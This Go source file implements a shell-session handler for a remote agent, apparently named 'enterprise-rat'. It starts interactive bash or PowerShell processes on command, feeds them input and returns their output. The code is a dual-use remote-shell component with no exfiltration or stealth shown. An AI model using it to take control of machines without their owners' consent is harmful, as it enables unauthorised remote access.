package executor

import (
	"context"
	"fmt"
	"io"
	"os"
	"os/exec"
	"sync"

	"github.com/enterprise-rat/agent/internal/models"
)

type PtyHandler struct {
	sessions    map[string]*PtySession
	mu          sync.RWMutex
	maxSessions int
}

type PtySession struct {
	ID     string
	Cmd    *exec.Cmd
	Stdin  io.WriteCloser
	Stdout io.Reader
	Cols   int
	Rows   int
	closed bool
	mu     sync.Mutex
	ctx    context.Context
	cancel context.CancelFunc
	output chan []byte
}

func NewPtyHandler() *PtyHandler {
	return &PtyHandler{
		sessions:    make(map[string]*PtySession),
		maxSessions: 10,
	}
}

func (h *PtyHandler) HandlePtyCommand(payload map[string]interface{}) (*models.CommandResponse, bool) {
	ptyType, _ := payload["pty_type"].(string)
	sessionID, _ := payload["session_id"].(string)

	if sessionID == "" {
		return &models.CommandResponse{
			ExitCode: -1,
			ErrorMsg: "missing session_id",
		}, false
	}

	switch ptyType {
	case "start":
		return h.startSession(payload)
	case "resize":
		return h.resizeSession(payload), true
	case "input":
		return h.handleInput(payload), true
	case "stop":
		return h.stopSession(payload), false
	default:
		return &models.CommandResponse{
			ExitCode: -1,
			ErrorMsg: fmt.Sprintf("unknown pty_type: %s", ptyType),
		}, false
	}
}

func (h *PtyHandler) startSession(payload map[string]interface{}) (*models.CommandResponse, bool) {
	sessionID, _ := payload["session_id"].(string)
	cols := int(getFloat64(payload, "cols", 80))
	rows := int(getFloat64(payload, "rows", 24))
	shell, _ := payload["shell"].(string)

	if sessionID == "" {
		return &models.CommandResponse{
			ExitCode: -1,
			ErrorMsg: "missing session_id",
		}, false
	}

	h.mu.Lock()
	if len(h.sessions) >= h.maxSessions {
		h.mu.Unlock()
		return &models.CommandResponse{
			ExitCode: -1,
			ErrorMsg: "max sessions reached",
		}, false
	}

	if _, exists := h.sessions[sessionID]; exists {
		h.mu.Unlock()
		return &models.CommandResponse{
			ExitCode: -1,
			ErrorMsg: "session already exists",
		}, false
	}
	h.mu.Unlock()

	if shell == "" {
		if isWindows() {
			shell = "powershell.exe"
		} else {
			shell = "/bin/bash"
		}
	}

	session, err := h.createPtySession(sessionID, shell, cols, rows)
	if err != nil {
		return &models.CommandResponse{
			ExitCode: -1,
			ErrorMsg: fmt.Sprintf("failed to create PTY: %v", err),
		}, false
	}

	h.mu.Lock()
	h.sessions[sessionID] = session
	h.mu.Unlock()

	return &models.CommandResponse{
		CommandID: sessionID,
		ExitCode:  0,
	}, true
}

func (h *PtyHandler) createPtySession(sessionID, shell string, cols, rows int) (*PtySession, error) {
	session := &PtySession{
		ID:     sessionID,
		Cols:   cols,
		Rows:   rows,
		output: make(chan []byte, 100),
	}

	session.ctx, session.cancel = context.WithCancel(context.Background())

	if isWindows() {
		return session, h.createWindowsSession(session, shell)
	}

	return session, h.createUnixSession(session, shell)
}

func (h *PtyHandler) createUnixSession(session *PtySession, shell string) error {
	cmd := exec.Command(shell, "-i")

	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}

	_, err = cmd.StderrPipe()
	if err != nil {
		return err
	}

	session.Stdin = stdin
	session.Stdout = stdout

	if err := cmd.Start(); err != nil {
		return err
	}

	session.Cmd = cmd
	return nil
}

func (h *PtyHandler) createWindowsSession(session *PtySession, shell string) error {
	cmd := exec.Command(shell)

	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}

	_, err = cmd.StderrPipe()
	if err != nil {
		return err
	}

	session.Stdin = stdin
	session.Stdout = stdout

	if err := cmd.Start(); err != nil {
		return err
	}

	session.Cmd = cmd
	return nil
}

func (h *PtyHandler) resizeSession(payload map[string]interface{}) *models.CommandResponse {
	sessionID, _ := payload["session_id"].(string)
	cols := int(getFloat64(payload, "cols", 80))
	rows := int(getFloat64(payload, "rows", 24))

	session := h.getSession(sessionID)
	if session == nil {
		return &models.CommandResponse{
			ExitCode: -1,
			ErrorMsg: "session not found",
		}
	}

	session.Cols = cols
	session.Rows = rows

	return nil
}

func (h *PtyHandler) handleInput(payload map[string]interface{}) *models.CommandResponse {
	sessionID, _ := payload["session_id"].(string)
	data, _ := payload["data"].(string)

	session := h.getSession(sessionID)
	if session == nil {
		return &models.CommandResponse{
			ExitCode: -1,
			ErrorMsg: "session not found",
		}
	}

	if data != "" && session.Stdin != nil {
		session.Stdin.Write([]byte(data))
	}

	return nil
}

func (h *PtyHandler) stopSession(payload map[string]interface{}) *models.CommandResponse {
	sessionID, _ := payload["session_id"].(string)

	session := h.getSession(sessionID)
	if session == nil {
		return nil
	}

	session.close()

	h.mu.Lock()
	delete(h.sessions, sessionID)
	h.mu.Unlock()

	return nil
}

func (h *PtyHandler) getSession(sessionID string) *PtySession {
	h.mu.RLock()
	defer h.mu.RUnlock()
	return h.sessions[sessionID]
}

func (h *PtyHandler) GetOutput(sessionID string) ([]byte, bool) {
	session := h.getSession(sessionID)
	if session == nil || session.Stdout == nil {
		return nil, false
	}

	buf := make([]byte, 4096)
	n, err := session.Stdout.Read(buf)
	if err != nil && err != io.EOF {
		return nil, false
	}

	return buf[:n], n > 0
}

func (s *PtySession) close() error {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.closed {
		return nil
	}
	s.closed = true

	if s.cancel != nil {
		s.cancel()
	}

	if s.Stdin != nil {
		s.Stdin.Close()
	}

	if s.output != nil {
		close(s.output)
	}

	if s.Cmd != nil && s.Cmd.Process != nil {
		s.Cmd.Process.Kill()
		s.Cmd.Wait()
	}

	return nil
}

func (s *PtySession) GetOutputJSON() (string, bool) {
	if s.Stdout == nil {
		return "", false
	}

	buf := make([]byte, 4096)
	n, err := s.Stdout.Read(buf)
	if err != nil && err != io.EOF {
		return "", false
	}

	return string(buf[:n]), n > 0
}

func isWindows() bool {
	return os.PathSeparator == '\\'
}

func getFloat64(m map[string]interface{}, key string, defaultVal float64) float64 {
	if v, ok := m[key].(float64); ok {
		return v
	}
	return defaultVal
}

type PtyOutputMessage struct {
	Type      string `json:"type"`
	SessionID string `json:"session_id"`
	Data      string `json:"data,omitempty"`
	Error     string `json:"error,omitempty"`
}

func (h *PtyHandler) PollSessionOutput(sessionID string) (string, bool) {
	session := h.getSession(sessionID)
	if session == nil || session.Stdout == nil {
		return "", false
	}

	buf := make([]byte, 8192)
	n, err := session.Stdout.Read(buf)
	if err != nil {
		if err != io.EOF {
			return "", false
		}
		n = 0
	}

	if n > 0 {
		return string(buf[:n]), true
	}

	return "", false
}
